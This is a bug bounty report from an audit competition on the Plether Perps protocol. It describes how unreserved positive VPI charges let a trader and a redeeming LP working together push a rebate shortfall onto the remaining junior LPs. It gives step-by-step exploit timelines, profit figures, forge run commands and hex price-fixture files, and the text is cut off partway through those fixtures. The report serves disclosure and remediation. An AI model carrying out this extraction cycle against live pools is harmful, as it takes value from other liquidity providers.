# \#97608 [SC-Critical] Plether Perps: returnable positive VPI booked as distributable LP equity lets a redeeming LP cohort export the close-side rebate onto the remaining junior tranche

**Submitted on Nov 2nd 2026 at 14:20:07 UTC by @pizzalover337 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97608
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

A positive VPI charge collected when a trader increases skew can be returned in full when
the trader later reduces skew. The protocol credits this charge to HousePool revenue as
soon as the open settles, but reserves nothing against the position's positive
`vpiAccrued`. An LP that redeems before the trader closes is therefore paid from principal
that includes funds the pool still owes back to the trader.

An attacker can control both the trader and the redeeming LP. After the redemption leaves,
the close pays the VPI rebate from remaining pool cash, and the next reconciliation
assigns the resulting shortfall to the junior tranche first. The LPs who remain in the
pool bear the loss, and the cycle repeats against them at every epoch boundary. In the
executed deferred-window PoC, one cycle nets the attacker $656.99 after all fees while
the remaining junior LPs absorb a $2,663.23 shortfall, and a control run of the identical
cycle with the redemption moved outside the window nets −$1,091.31.

## Impact

Impact claimed: Theft of unclaimed yield. Severity claimed: **High**.

Value booked as junior-tranche revenue out of a charge the pool still owed back to the
trader is exported out of the pool by a redeeming LP cohort before the trader's close
returns it; the resulting shortfall is charged to the junior LPs who remain, none of whom
has claimed any of it. In the executed deferred-window PoC, one cycle nets the attacker
coalition $656.99 after all execution fees, carry and gas, while the standing junior
cohort absorbs a $2,663.23 shortfall charged junior-first by the waterfall, and a sentinel
LP's identical 0.5M stake redeems at 991.54 per 1,000 fair while the attacker exited at
1,000.36. The attack is permissionless, requires no privileged role, no misconfiguration
and no particular market direction, and repeats at the 1-hour LP-epoch cadence against the
same standing cohort.

A control run isolates the cause. The identical cycle with a single change, namely the
redemption request moved past the epoch cutoff so that it prices after the close, yields a
coalition net of −$1,091.31. The unreserved booking, not fees or mark drift, is what pays
the attacker.

Escalation, offered for the triager's assessment rather than as the claim: within any
single cycle the pool as a whole remains solvent; value moves between LP cohorts rather
than out of the protocol, and the attack compounds by repetition toward junior insolvency,
diluting every deposit priced inside a live window (in the executed PoC a sentinel deposit
minted measurably fewer shares than an identical deposit one epoch earlier, with no
redemption anywhere in its settlement pass). The shortfall is charged below the juniors'
principal line: `juniorPrincipal` drops by the absorbed amount against deposit-backed
value. If that loss is read as a reduction of the LPs' principal rather than of
distributed yield, the same demonstrated facts satisfy the Critical entry "Direct theft
of any user funds, whether at-rest or in-motion": the PoC demonstrates the mechanism
identically under either reading.

Victim: the remaining HousePool junior LPs whose tranche principal absorbs the exported rebate
through the junior-first shortfall, and any LP whose deposit or redemption is priced inside a
live VPI window.

## Root cause

**Between a skew-increasing open's collection of a positive VPI charge and the skew-reducing
close that returns it, nothing reserves the still-returnable charge from LP equity. Every LP
redemption priced inside that window therefore exits with a share of a charge the pool owes
back.**

## Mechanism

1. Booking. `CfdEngineSettlementSidecar.executeOpen` (lines 446-464). When an open settles,
   the whole VPI charge `V` lands in the HousePool as `recordClaimantInflow(V, Revenue,
   CashArrived)`. With live tranches this is immediately distributable pool equity:
   `HousePool.recordClaimantInflow` credits `accountedAssets`, and `Revenue` is queued into
   pending trading revenue only when `seniorPrincipal + juniorPrincipal == 0`. The trader's
   right to the whole charge back is recorded in parallel (`vpiAccrued = +V`, written at
   sidecar line 517), but the engine creates no escrow for it. The `vpiRebateReserve`
   ledger, which does escrow returnable VPI, exists only for the negative side (sidecar
   466-477: `lockVpiRebateReserve` runs only on a negative charge). Demonstrated on-chain at
   the open transaction: pool inflow equals V exactly, `vpiRebateReserve == 0`,
   `pendingTradingRevenue` unchanged.

2. Recognition. Every `settleLpEpoch` reconcile (`HousePool._settleLpEpoch`,
   HousePool.sol:824, reconcile call at :835). `HousePoolAccountingLib.buildReconcileSnapshot`
   (lines 60-78) computes distributable pool equity from physical assets, trader claims and
   the terminal price delta, with no deduction for open positions' positive `vpiAccrued`, and
   `HousePoolReconcilePlanLib.planReconcile` (surplus routing at lines 84-99) sends the
   surplus through `distributeRevenue` into `juniorPrincipal`
   (`HousePoolWaterfallAccountingLib.sol:140-159). The string "vpi" does not appear anywhere
   in HousePool.

3. Payment. `executeClose` (sidecar 618-624; the rebate payment itself at 621-624) with
   `CfdEnginePlanLib` 953-977 and `CloseAccountingLib` 103-118. The close returns the
   accrual out of current pool free cash.
   `CashPriorityLib.reserveFreshPayouts` reserves only trader claims, never LP liability,
   buffer, or any escrow of previously distributed VPI income, so `freePoolCashAssets` still
   contains the booked `V`, and `HousePool.payOut` sends it (`accountedAssets -= paid`). The
   lifetime clamp caps the rebate at the position's VPI accrual, net of the close leg's own
   costs: the executed run emitted `ActionRebateSettled` with `assessed == paid == $2,627.36`
   and `waived == 0` against the open-leg accrual `V = $3,360.65` (the $733.28 difference is
   the close leg's 4 bps execution fee), and `juniorPrincipal` was unchanged by the payment
   transaction. The shortfall surfaces only at the next reconcile, junior-first, on whoever
   still holds shares.

Conservation therefore fails across LP cohorts rather than for the pool as a whole: the
redeeming cohort realizes redemptions exceeding its pre-window entitlement by the pro-rata
share of `V`, the trader is made whole by the rebate, and the difference is absorbed by the
remaining juniors with no offsetting trader loss.

## Two exploitation paths

The defect is exercisable through two orderings of the same legs. Both were executed on the
fork.

Primary path (cross-epoch). The redemption is requested after the banking epoch's cutoff and
matures an epoch later, so the banking settle provably funds zero redemptions and the
same-settlement pricing described below never runs. The extraction still works because every
settle between the engine's booking and the engine's payment prices the contaminated
principal. The window is "any settle before the close", not "the banking pass". The full
executed timeline is in the next section.

Variant (same settlement). The redemption phases of a `settleLpEpoch` pass read
`pricingPrincipal` after the reconcile has banked V into `juniorPrincipal`
(`HousePool.sol:839-888`), so a queued junior redemption converts shares to cash at a
principal that includes V. Executed result: one settle first banks $3,699.82 as junior revenue
(V plus mark drift), then funds the attacker's matured redemption at the inflated principal, a
payout of $2,502,312.66 against a $2,500,000.00 fair value, a harvest of $2,312.66. The close
then returns the accrual from pool cash and the following settle charges $2,801.24 junior-first
to the remaining holders. A sentinel LP with an identical stake realized −$471.51 on its $500k
redemption (per-share 998.567 against the attacker's 1000.435; same deposit, same terms, one
epoch apart). The variant's control is the decisive falsification: move only the redemption
request past the epoch cutoff so that it prices after the close, and the identical cycle
yields a coalition net of −$1,091.31.

## Executed scenario (primary path, arbitrum-sepolia fork of the deployed stack)

Attacker: one operator with two plain contracts (no cheatcodes against the targets; actors are
funded through the deployment's public `MockUSDG.mint`). Marks are real signed Pyth keeper
blobs with block and transaction provenance inline in the fixtures. LP epochs are 1h.

1. ep498160-498161: the attacker LP deposits 2.5M USDG junior; a sentinel LP deposits 0.5M
   (activated at the fair pre-window price).
2. ep498162: the sentinel deposits a second 0.5M (tranche T2), which matures for activation at
   the ep498163 settle and provides that settle's required "progress".
3. ep498163: the trader opens LONG 19,000 lots (~$1.83M notional, ~36% skew). The whole VPI
   charge V = $3,360.65 lands as Revenue/CashArrived: `pool.totalAssets()` rises by exactly V,
   `vpiAccrued = +V`, `vpiRebateReserve = 0`, `pendingTradingRevenue` unchanged. The attacker
   then requests its full redemption after the epoch cutoff (matures ep498164).
4. Banking settle: the reconcile banks V (plus drift) as junior revenue and prices zero
   redemptions (`LpEpochSettled` carries `juniorRedeemAssets == 0`, asserted in the test). Its
   only priced entry is the sentinel's T2, which mints fewer shares
   than the identical T1 deposit one epoch earlier: the contamination repriced a deposit with
   no redemption in the pass.
5. ep498164, one full epoch later: a router settle funds the attacker's matured redemption at
   the still-V-inflated principal, a payout of $2,502,132.71 against a $2,500,000.00
   pre-window fair value, harvesting $2,132.71 (101.5% of the attacker's pro-rata share f·V).
6. Same epoch, after the redemption: the trader closes the full position. Net depth is lower,
   the lifetime clamp caps the rebate at the position's VPI accrual, and the planner pays
   $2,627.36 (the $3,360.65 accrual net of the close leg's $733.28 execution fee) from
   trader-claims-only free pool cash: `assessed == paid`, `waived == 0`, `juniorPrincipal`
   unchanged by this transaction, `vpiAccrued` back to exactly 0.
7. ep498165: the next reconcile absorbs the shortfall junior-first: a pure absorb of $2,663.23
   charged to whoever still holds (sentinel plus unredeemed T2), senior untouched (asserted).
   The sentinel's identical 0.5M stake redeems at 991.54 per 1,000 fair while the attacker
   exited at 1,000.36, a measured per-share cohort differential.

Coalition result per ~4h cycle: the trader's own charge is returned in full (modulo fees)
while the attacker LP already left with $2,132.71 of the same charge; net +$656.99 after all
fees, carry and gas (final assertion on `usdg.balanceOf(attackerLp)`). The same-settlement
variant nets +$660.25 per cycle on the same accounting.

## Documentation analysis

Every mechanical leg is documented in the project's own material at the audited commit
`a82d4fef` (byte-identical to the deployment source `1209ca8a`):

- WHITEPAPER.md:811, "VPI | Price a change in directional skew | Pool when positive; trader
  rebate when negative"; :411-412, "Positive VPI increases physical pool assets".
- ACCOUNTING_SPEC.md:635, "`recordClaimantInflow(amount, Revenue, CashArrived)`: claimant-owned
  value where fresh cash entered the pool in this flow"; WHITEPAPER.md:765-766 same.
- WHITEPAPER.md:903-904: the $20,000 telescoping example makes the charge returnable
  ("Reversing the move at unchanged depth produces a $20,000 rebate").
- WHITEPAPER.md:885-886 / ACCOUNTING_SPEC.md:1061-1063 / SECURITY.md:871: the close-time action
  rebate "comes only from pool cash free of existing trader claims".
- ACCOUNTING_SPEC.md:337, "Charge a shortfall to Junior first, then Senior."

The protective statements are all scoped to the negative (receivable) side of the same
mechanism. SECURITY.md:866-871 reserves gross negative lifetime VPI ("a dedicated
nonwithdrawable reserve equal to `max(-vpiAccrued, 0)`"); WHITEPAPER.md:887-888 excludes that
reserve from the terminal price curve ("so LPs cannot withdraw it as marked equity before the
matching position obligation settles"); SECURITY.md:376 states VPI reserve conservation for
the negative side only. No first-party statement classifies the returnable positive charge's
ownership. The nearest permissive analogue, the carry collection-timing policy
(ACCOUNTING_SPEC.md:731-740, "not a claim that timing cannot transfer part of old carry
revenue to a new LP"), covers carry, which is not returnable: a closing trader cannot reclaim
collected carry, but can reclaim the entire VPI charge. The repository's own tests assert only
trader-side invariants (`VpiRoundTripAccounting.t.sol`: "Depth manipulation round-trip must
not produce positive PnL", "VPI clamp should prevent net rebate extraction"); no test covers
an LP redemption inside the VPI window.

## Relation to known issues

None of the program's published known issues covers this mechanism.

- Cecuro HIGH-1 (Arbitrum/Pyth clock alignment) concerns commit-side latency under clock skew.
  This demonstration commits and settles on fresh, honestly-kept marks; no latency, skew or
  race is involved.
- SC-M4 (pre-audit, "Risk Free Option in 60Sec Oracle Window") is an oracle-window order
  timing option. This report is an LP-cohort accounting defect, an unreserved returnable
  charge, not order timing or optionality.
- Cecuro MED-22 (carry rounding): the deltas here are exact, not a rounding edge. MED-16 and
  LOW-57 (opens committed against a stale cached price; keeper bounty sizing): the opens here
  commit against fresh marks. MED-13 (oracle rotation retargeting armed stop-losses) and MED-7
  (older valid signed price per feed): no rotation, no price selection, one feed basket
  throughout.
- The known-issue entry on ordinary closes carrying no execution bounty concerns close-path
  keeper economics. Both paths in this report are open-side VPI booking and LP-side pricing.

## Affected assets

Deployed on arbitrum-sepolia (chain 421614), perps v2.0.0:

- CfdEngineSettlementSidecar `0xd3ede337e042d5aa6ba68e03d0c885b3d4a062dc` (booking and payment)
- CfdEngine `0xca18a6783d7542f9d2f28f4f259772b74c4d6baa` (vpiAccrued)
- HousePool `0xeb5604c393843b2f3c347ec24fa9ddad6ab2131e` (revenue booking, payOut,
  settleLpEpoch pricing)
- Junior vault `0x4a8b67184a1e3224c11a191cc69f22c50eef734e`, Senior vault
  `0x5dc42ba5a1e8dd3e1b6868d10f66a9bf8fb5b83d`
- MarginClearinghouse `0xb5b851f627d6df3cf3f096e23e20a58884d7b89a`, OrderRouter
  `0x918663d6da8cb33b325a04c4a5e8c51d42f3b444`, settlement USDG
  `0x3d051dbbf5ff427a4ae8ad09746902666af8fb9d`

All are non-proxy deployments; on-chain bytecode was verified identical to the audit pin
`a82d4fef` at every fork block used below (the only differences are constructor immutables
and the metadata hash). The PoCs touch none of the six excluded view-only lens and quoter
contracts.

## Economics

All numbers come from the executed traces; USDG is counted 1:1.

- VPI charge booked and returned in full: V = $3,360.65 per open/close round trip at 19,000
  lots (~$1.83M notional, ~36% skew; vpiFactor 0.01, maxSkewRatio 0.4 at deployed defaults).
- Gross harvest per cycle (excess over pre-window fair value): $2,132.71 (attacker junior
  share f ≈ 0.556 of 4.5M junior).
- Attacker cost per cycle: $1,476.43, consisting of two 4 bps execution fees on the notional
  (about $733 at the open and $733.28 at the close, exactly the accrual-minus-paid gap),
  carry, and gas (11,702,125 gas ≈ $0.70 at L2 base fee with ETH at a $3,000 stand-in).
- Net +$656.99 per ~4h cycle, repeatable at the 1-hour epoch cadence, on a $2.5M parked
  junior stake.
- Realizable bound: at most ~8 bp of net pool depth per cycle (about $1.6k against the
  standing $2.0M TVL; about $4k at the PoC's $5.0M depth).
- Victim loss: the standing junior cohort absorbs $2,663.23 per cycle (junior-first); deposits
  priced inside any window are diluted in the same way as the sentinel's T2.

## Recommendation

Reserve the returnable positive VPI from distributable LP equity symmetrically with the
negative side. Concretely, either book positive VPI charges into `vpiRebateReserve` (or
`pendingTradingRevenue`) until the position's skew-reducing leg settles and release only the
waived or expired remainder as revenue, or price LP redemptions and deposits inside any live
returnable-VPI window off the reserve-adjusted principal that the negative side already uses.

## Limitations and environment notes

- Deployed configuration only (vpiFactor 0.01e18, maxSkewRatio 0.4, 1h LP epochs, 4 bps
  execution fee per leg, markStalenessLimit 60s); no other configuration exists to test.
- The demonstrated window is one epoch; multi-epoch windows are mechanically identical but
  were not run.
- The close ran in the FAD sub-window before the Friday 21:00Z oracle freeze; a frozen-regime
  close would reduce the rebate by the frozen spread.
- Mark drift between the open and settle/close marks was ~0.13 bp (about $25 on the position);
  an adverse intraday move could shrink or invert a single cycle's surplus. The attacker times
  the settles; the marks are the public keeper stream.
- The senior impairment path was not exercised (senior stayed at its high-water mark; the
  waterfall's senior-restore branch never ran).
- The sentinel's T2, minted at the inflated price, was left unredeemed; the realized victim
  witness is the sentinel's impaired T1 redemption and the junior-first absorb.
- The banking settle requires HousePool "progress" (any matured deposit or redemption demand);
  in a fully idle pool the returnable V would sit in unreserved totalAssets until the first
  settle with progress, which is still LP-facing equity, only the principal-folding timing
  differs.
- The Pyth ticks are the frozen public stream (keepers stopped at pt 1793393999);
  live-streaming freshness and racing were not exercised.
- Test environment: the fork runs under chainid 31337 (anvil's ArbSys emulation does not track
  `vm.roll`, so the router's SameBlock shield could never clear on a 421614 fork; the
  repository's own tests run on 31337; chainid feeds only EIP-712 domains here). `vm.warp` and
  `vm.roll` schedule the declared epoch-cadence timeline against the real signed ticks. The
  pinned fork state was served by an archive gateway; the public rollup RPC prunes.

## Proof of Concept

Both demonstrations are reproduced entirely from the material inline in this section. Two test
files cover the two paths, and each test drives 22 deployed contracts through the real router,
engine, clearinghouse and pool paths:

- Primary path (cross-epoch): `testVpiCrossEpochHarvest` in `test/VpiCrossEpochPoc.sol` proves
  the engine's booking and payment legs with the same-settlement coupling removed. The
  redemption is requested after the banking epoch's cutoff, matures an epoch later, and the
  banking settle provably funds zero redemptions.
- Variant (same settlement): `testInsideWindowHarvest` and its control `testAfterCloseOrdering`
  in `test/VpiSameEpochPoc.sol` prove the same-settlement pricing path and isolate the cause.

## Environment

- foundry (forge) 1.8.x; solc 0.8.35 is auto-managed by the repository's configuration.
- Clone `https://github.com/immunefi-team/audit-comp-plether`, check out commit `a82d4fef`,
  and work inside the `packages/perps` foundry project (its `foundry.toml` carries the
  remappings, solc 0.8.35, optimizer and via_ir). Create the four files below under
  `packages/perps/test/`; no other setup is needed.
- An arbitrum-sepolia archive RPC endpoint serving historical state at block 325012936
  (primary path) and 324710693 (variant). The public rollup RPC prunes after roughly 29
  minutes; the gateways named below served both pins.
- Each test selects its fork endpoint from the environment variable `HUNT_FORK_URL` (an
  arbitrary name) and pins its own fork block, so no `--fork-url` flag is needed.

## Files (under `packages/perps/test/`)

| file | contents |
|---|---|
| `packages/perps/test/Ticks.sol` | real-tick fixtures shared by both tests |
| `packages/perps/test/Ticks164.sol` | primary-path tick fixtures |
| `packages/perps/test/VpiCrossEpochPoc.sol` | primary-path PoC |
| `packages/perps/test/VpiSameEpochPoc.sol` | variant PoC and control |

## Run: primary path (fork block 325012936)

From `packages/perps/`:

```bash
export HUNT_FORK_URL=https://gateway.tenderly.co/public/arbitrum-sepolia
forge test --match-path test/VpiCrossEpochPoc.sol --match-test testVpiCrossEpochHarvest -vvvv
```

Expected: PASS, with these logged witnesses (micro-USDG, 6 dp), each asserted in the test:

```text
VPI charge V (returnable accrual): 3360646912; pool totalAssets inflow at open: 3360646912
  (booking leg: the whole charge became unreserved pool equity; vpiRebateReserve 0,
   pendingTradingRevenue unchanged)
juniorRedeem/DepositAssets at the banking pass: 0 500000000000
  (control: the banking settle priced ZERO redemptions; sentinel T2 minted fewer shares than
   identical T1)
attacker deferred-epoch payout 2502132714093 vs fair 2499999999999 -> excess over fair:
2132714094  (the deferred-window harvest)
rebate assessed/paid/waived: 2627362189 2627362189 0
  (payment leg: full accrual returned from trader-claims-only free cash; juniorPrincipal
   unchanged across the close)
pure junior-first shortfall absorb: 2663227533; sentinel redeems at 991.54/1000 fair vs
attacker 1000.36  (the cohort export)
coalition net USDG (deferred window): 656988129
```

## Run: variant and control (fork block 324710693)

From `packages/perps/`:

```bash
export HUNT_FORK_URL=https://arbitrum-sepolia.gateway.tenderly.co
forge test --match-path test/VpiSameEpochPoc.sol --match-test testInsideWindowHarvest -vvvv
# Control: the identical cycle with the redemption request moved past the epoch cutoff:
forge test --match-path test/VpiSameEpochPoc.sol --match-test testAfterCloseOrdering -vvvv
```

Expected: both PASS, with these logged witnesses (identical at fork blocks 324710693,
324975351 and 325012936):

```text
VPI charge V collected at open: 3360646912                    (returnable charge, micro-USDG)
junior revenue booked at the in-window settle: 3699816272     (V + mark drift banked to juniors)
attacker inside-window payout: 2502312663249                  (fair at pre-window principal: 2499999999999)
excess over fair: 2312663250                                  (the harvest, $2,312.66; expected f*V = 2100656907)
junior-first absorbed at post-close settle: 502329728358      (net of the sentinel's funded 499,528.49
                                                               redemption = $2,801.24 absorbed from remaining juniors)
sentinel after-window payout: 499528485548                    (identical stake, -$471.51 vs deposit;
                                                               per-share 998.567468e6 vs attacker 1000.434647e6)
coalition net USDG (inside window): 660248977                 (+$660.25 per ~3h cycle, repeatable)
---- control ----
attacker after-close payout: 2500562621507                    (excess +$562.62 ~= f x ~$920 retained
                                                               execution fees, NOT of V)
coalition net USDG (after-close ordering): -1091305371        (-$1,091.31: the identical cycle without
                                                               the in-window exit loses the fees and nothing else)
```

## Revalidation

The primary-path PoC was run at four fork blocks spanning 2026-10-31 to 2026-11-01 (324710693,
324975465, 324979289 and 325012936; the last is 302,243 blocks, about 21 hours, after the
first) with byte-identical logged witnesses and unchanged deployed code hashes for the engine,
settlement sidecar, HousePool and router. The variant PoC and its control were re-run at blocks
324710693, 324975351 and 325012936 with identical results. On-chain bytecode was re-verified
against the audit-pin source at every block (non-proxy, no upgrade during the window).

## Full sources (comments stripped to fit the size limit; semantics and logged output unchanged)

### test/Ticks.sol (shared by both tests)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;
library Ticks {
/// pt=1793386811 block=324428454 tx=0x7f3bbd78d529e2a737fb603640245850cb78fd2efcc646970c7f0299c0c10c9f - epoch 498163 B-open mark
bytes internal constant T1_B_OPEN_163 = hex"504e41550100000001240100000001030124bea331b91ab114b581426c029c920816b92e8108c96fe830b64d927b39f4ff672a80ae32ef7c0677609f25dc665bef2811fcdafcdc80d0ef01d2111bf36e75010206390b58c28df971a9b338efb02515040326e249ee1be8ab9ca02aa0fc273d7f0f76a20eefaba709d967ccafe18b2d033be21af36bee9763813b43e72d6e87ea0104171ee574785dcd91674c6c950dd12dd6b9abeff0fc439580ffe24823353bad5c428cbb00fdc29b6069fe3183869be77e2054d10ac1c6a6d2bc66e5694847b84f006ae4e93b00000000001a507974686e6574507974686e6574507974686e6574507974686e6574507974680000000859e2389c0041555756000000000859e2389c000000009e97bb7eb86bfa8c59b625ef418790f7e5636fd506005500a995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b000000000001b42c0000000000000002fffffffb000000006ae4e93b000000006ae4e93a000000000001b3ff00000000000000020c4396095a2dbc7d79b81fc14cbe0928a894e7d5b732d44ab2458b3117f1296dbca89487ab5e68a095c597ae859048868c3d548762d4500d2c79fa30414fdc18d2b9dd704f7e11ebb1883e3c77dca91392425822bb0d4dedbc148b3709ce283cfccd321bdfe67df69b00b2f89a236b59ca0c60bb7571648ee993a207e317d6508ae45f0694355537d493ee633232b1da8b58b4dcb633fa4fdcb3bdbf45327816002a10bf4c641f811454266e86baf6a530975d0831455c846b13ed3821b1c65c1a9cab11bd4fb26836b952e857d5b3d27e3c931197a6461a16ffbcac84731140c2eb617b22210af60763a3bc2eccf72172005500ef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd5200000000000266bf0000000000000006fffffffd000000006ae4e93b000000006ae4e93a00000000000266db00000000000000050c189909c5ad7175733d4066aaff1faea36bb59b92bcbe697bb2566e198034b79dd2d2fb434cfab75a478ac5115588bc77c422b40c7909140a345726df9f53ea9360adce68518169839cfa7f262c62fba5425822bb0d4dedbc148b3709ce283cfccd321bdfe67df69b00b2f89a236b59ca0c60bb7571648ee993a207e317d6508ae45f0694355537d493ee633232b1da8b58b4dcb633fa4fdcb3bdbf45327816002a10bf4c641f811454266e86baf6a530975d0831455c846b13ed3821b1c65c1a9cab11bd4fb26836b952e857d5b3d27e3c931197a6461a16ffbcac84731140c2eb617b22210af60763a3bc2eccf7217200550084c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c10000000000020b2c0000000000000004fffffffb000000006ae4e93b000000006ae4e93a0000000000020b2600000000000000040c5c7a189f046d216fe14bf215e7bf6949a474e3c532d44ab2458b3117f1296dbca89487ab5e68a095c597ae859048868c3d548762d4500d2c79fa30414fdc18d2b9dd704f7e11ebb1883e3c77dca91392425822bb0d4dedbc148b3709ce283cfccd321bdfe67df69b00b2f89a236b59ca0c60bb7571648ee993a207e317d6508ae45f0694355537d493ee633232b1da8b58b4dcb633fa4fdcb3bdbf45327816002a10bf4c641f811454266e86baf6a530975d0831455c846b13ed3821b1c65c1a9cab11bd4fb26836b952e857d5b3d27e3c931197a6461a16ffbcac84731140c2eb617b22210af60763a3bc2eccf721720055003112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca00000000000221330000000000000004fffffffb000000006ae4e93b000000006ae4e93a000000000002212a00000000000000040c534346ec281a69c906676e1c86279f32d4e70cd968320eec395a73855803f8e98ad585c0d95c2e4d478ac5115588bc77c422b40c7909140a345726df9f53ea9360adce68518169839cfa7f262c62fba5425822bb0d4dedbc148b3709ce283cfccd321bdfe67df69b00b2f89a236b59ca0c60bb7571648ee993a207e317d6508ae45f0694355537d493ee633232b1da8b58b4dcb633fa4fdcb3bdbf45327816002a10bf4c641f811454266e86baf6a530975d0831455c846b13ed3821b1c65c1a9cab11bd4fb26836b952e857d5b3d27e3c931197a6461a16ffbcac84731140c2eb617b22210af60763a3bc2eccf721720055008ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc67600000000000efb1e000000000000005ffffffffb000000006ae4e93b000000006ae4e93a00000000000efc9000000000000000690ceaf23aa3c120fba093d44d3f4f01788b92a0946a73cc0b43371db5e36ea54fabbeed7c98a45066b32e7d2a6db720e50419bf2b0a2f9650eb774ce7788abd90fc392a9e913282f32d9244251a71465b29375a0e2b502093dd72b5d2fe08b665253c2fed4ec07c7a37c1a1c0230d2ec6e459a3afb6c36dd7d2ec45b2a374c414076664d6a5cbdcd1b063b901f79243ce541566948b16ce0f222e76b1b101a3e0f6c92e0c31b4fab6bfc7154192a28136f92031619854c877af85ba5bd99fbee568e6574cafa8feeef9b952e857d5b3d27e3c931197a6461a16ffbcac84731140c2eb617b22210af60763a3bc2eccf721720055000b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f800000000000141bc0000000000000003fffffffb000000006ae4e93b000000006ae4e93a00000000000141c400000000000000030c62a937aba308f8bd0741c5edcdb0328c287e80ccbcbe697bb2566e198034b79dd2d2fb434cfab75a478ac5115588bc77c422b40c7909140a345726df9f53ea9360adce68518169839cfa7f262c62fba5425822bb0d4dedbc148b3709ce283cfccd321bdfe67df69b00b2f89a236b59ca0c60bb7571648ee993a207e317d6508ae45f0694355537d493ee633232b1da8b58b4dcb633fa4fdcb3bdbf45327816002a10bf4c641f811454266e86baf6a530975d0831455c846b13ed3821b1c65c1a9cab11bd4fb26836b952e857d5b3d27e3c931197a6461a16ffbcac84731140c2eb617b22210af60763a3bc2eccf72172";
/// pt=1793386919 block=324428839 tx=0x87ee6102f7c650186e23fa80d25b0aca9b8794b6129478226d38060b39762edc - epoch 498163 victim-settle mark (108s after B's open)
bytes internal constant T3_SETTLE_163 = hex"504e4155010000000124010000000103018084b2f542ce6090526b4b7da5d5f60c1053b7986d1c0db4caec6f7a1a7bcdee61325a03b188cfdc76a28ec2c820fd6f7245d2cf7395286090f2165bfa6a392400027d520e4673dd6623e74619d4c787acb8a7286f368c56a98a139a6b5043cb8db311238f954812f687ed6994ce477d4b107b9b0b3f327ce3e3d48d531796679b1400043ac45b4a6c7f8e03cb612be587bfb9fddc160758c7cd777b4fe90e1702cfa01270f61271bc6eb4cf172f3fc0cdebec7db49566a6e634aa1de54a778b87c498a0006ae4e9a700000000001a507974686e6574507974686e6574507974686e6574507974686e6574507974680000000859e2410c0041555756000000000859e2410c00000000ff117cdf32d5ed72530d47451b0533bcb3122d6206005500a995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b000000000001b4420000000000000003fffffffb000000006ae4e9a7000000006ae4e9a6000000000001b40100000000000000020c63e50a33d410656544d1f1618bdf3ef7dca2e4a42f033e89853fa3c2d0eb1216cffcf99b155627b451152baf175e46be2217c90e0189622eedccb9cbe8a66e00e28ba1b980b44aa8c2462228477c69daf35f869a031652640d2cc150eaed46c78df85da5eac8c3c910b9ef28d71752396051012bf6202274599b0b34233cb38a3f2adb2765f51515fe89918406046bef13819ac0334bca94348abc451d1c84090a72ef95411ad9937d3f634f5f4da4b91787e00707bd4dc7df01bacfb581f777ce176c0c15271fdaa0366e5528ddcf959f672ec4acd49856285477c5dbd3605bfd5c1019cf65a3ba3aba0b738b5a94fd005500ef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd5200000000000266a7000000000000000dfffffffd000000006ae4e9a7000000006ae4e9a600000000000266d900000000000000050c1e09552f51a8e3e2371cb292ae86edded81a241094f20d8e3ca13251ba690a7d2c398289b5f53573543fa9f0ceeb38d2aa7fa8f8afb6c3253a8f7d2e20b6360f53af3158447e7d02b41189e6f7bb15c9f35f869a031652640d2cc150eaed46c78df85da5eac8c3c910b9ef28d71752396051012bf6202274599b0b34233cb38a3f2adb2765f51515fe89918406046bef13819ac0334bca94348abc451d1c84090a72ef95411ad9937d3f634f5f4da4b91787e00707bd4dc7df01bacfb581f777ce176c0c15271fdaa0366e5528ddcf959f672ec4acd49856285477c5dbd3605bfd5c1019cf65a3ba3aba0b738b5a94fd00550084c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c10000000000020b4a0000000000000004fffffffb000000006ae4e9a7000000006ae4e9a60000000000020b2700000000000000040c32bdc3547d6fd59c719a8b62c86f13f1d382316a2f033e89853fa3c2d0eb1216cffcf99b155627b451152baf175e46be2217c90e0189622eedccb9cbe8a66e00e28ba1b980b44aa8c2462228477c69daf35f869a031652640d2cc150eaed46c78df85da5eac8c3c910b9ef28d71752396051012bf6202274599b0b34233cb38a3f2adb2765f51515fe89918406046bef13819ac0334bca94348abc451d1c84090a72ef95411ad9937d3f634f5f4da4b91787e00707bd4dc7df01bacfb581f777ce176c0c15271fdaa0366e5528ddcf959f672ec4acd49856285477c5dbd3605bfd5c1019cf65a3ba3aba0b738b5a94fd0055003112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca00000000000221250000000000000004fffffffb000000006ae4e9a7000000006ae4e9a6000000000002212a00000000000000040c643b09b102e68ac75ddd3d94e238b4b733942207098f96fe3cb7c70be08816b3671c84337cef7902543fa9f0ceeb38d2aa7fa8f8afb6c3253a8f7d2e20b6360f53af3158447e7d02b41189e6f7bb15c9f35f869a031652640d2cc150eaed46c78df85da5eac8c3c910b9ef28d71752396051012bf6202274599b0b34233cb38a3f2adb2765f51515fe89918406046bef13819ac0334bca94348abc451d1c84090a72ef95411ad9937d3f634f5f4da4b91787e00707bd4dc7df01bacfb581f777ce176c0c15271fdaa0366e5528ddcf959f672ec4acd49856285477c5dbd3605bfd5c1019cf65a3ba3aba0b738b5a94fd0055008ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc67600000000000efa4b0000000000000060fffffffb000000006ae4e9a7000000006ae4e9a600000000000efc8000000000000000690c11a9701a5ca8c7393d8cafb87dd88388575b396842b4320d1822f185333c6211b5e2398fe99fe1a86a0d696d171cb72b246457ac30f52de9593bc51fea846f3961c21b1bf94994ff9b8ef6cc57b7074d259607f44f7f9247a1db88db1d6eacf7c3e5b5135bbe3330c9209e03d2da904249a006843fd299cc9e1b953b281ce24d48b548b913af84efef4c2b59e9d52ea157f6ed442542dc1b07206f5e3208b5703d452ba950e65c84437d970c476f4934b11bb8fc97a4a5c69c80c09aa4bdd5